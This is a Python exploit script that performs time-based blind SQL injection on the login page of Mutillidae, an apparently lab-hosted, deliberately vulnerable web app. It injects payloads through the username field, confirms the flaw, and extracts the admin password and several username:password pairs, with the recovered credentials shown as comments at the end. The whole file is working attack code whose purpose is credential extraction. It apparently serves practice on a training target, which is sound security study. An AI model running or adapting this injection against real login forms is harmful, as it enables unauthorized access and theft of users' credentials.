#!/bin/python

import string
import requests
from sqlinja import MySqlConfig, SqlInja
import sys

# config
# request execution
def exec_request(payload: str, sleep_duration : int) -> bool:
    cookies = dict(showhints='0',PHPSESSID='408ecb703b7f0234422052d468ea6fc7')
    url = "http://10.100.0.136/mutillidae/index.php?page=login.php"
    datas = {
        'username': f"test' OR {payload}#",
        'password': "pass",
        'login-php-submit-button': "Login",
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    res = requests.post(url, data=datas, headers=headers, allow_redirects=False, cookies=cookies)    
    result = res.elapsed.seconds >= sleep_duration
    #sys.stdout.write(f"[PAYLOAD] {payload} : {result}\n")
    return result

helper = SqlInja(MySqlConfig(), exec_request, MySqlConfig.payload_int_time)

def check():
    helper.prepare_new(template=MySqlConfig.payload_int_time)
    # Is target vulnerable ?
    if(helper.check("SELECT 1")):
        sys.stdout.write("Target is Vulnerable\n")
    else:
        sys.stdout.write("Target is not Vulnerable\n")
        sys.exit()

def extract_admin_pass():
    # extract pass for Admin
    candidates = SqlInja.string_to_candidates(string.ascii_letters)
    helper.prepare_new(candidates, template=MySqlConfig.payload_str_time)
    sys.stdout.write("pass for 'admin' : ")
    pwd = helper.extract_cell("SELECT password FROM accounts WHERE username = 'admin' LIMIT 0,1")
    for char in pwd:
        sys.stdout.write(chr(char))
        sys.stdout.flush()
    sys.stdout.write("\n")

def extract_all_creds():
    # Extract number of account
    helper.prepare_new([*range(0, 500)], template=MySqlConfig.payload_int_time)
    rq = "SELECT COUNT(*) FROM accounts"
    nbAccount = helper.extract_val(rq)
    sys.stdout.write("Numbers of accounts : %i \n" % nbAccount)

    candidates = SqlInja.string_to_candidates(string.ascii_letters + string.digits + ':')
    helper.prepare_new(candidates, template=MySqlConfig.payload_str_time)
    # Extract top 5 usernames:password
    users = helper.extract_column(string.Template("SELECT CONCAT(username, ':', password) FROM accounts ORDER BY username LIMIT $index,1"), 0, 3)#nbAccount - 1)
    for cell in users:
        sys.stdout.write("Username:Password : ")
        for char in cell:
            sys.stdout.write(chr(char))
            sys.stdout.flush()
        sys.stdout.write("\n")

check()
# Target is Vulnerable
extract_admin_pass()
# pass for 'admin' : adminpass
extract_all_creds()
# Numbers of accounts : 16 
# Username:Password : admin:adminpass
# Username:Password : adrian:somepassword
# Username:Password : bobby:password
# Username:Password : bryce:password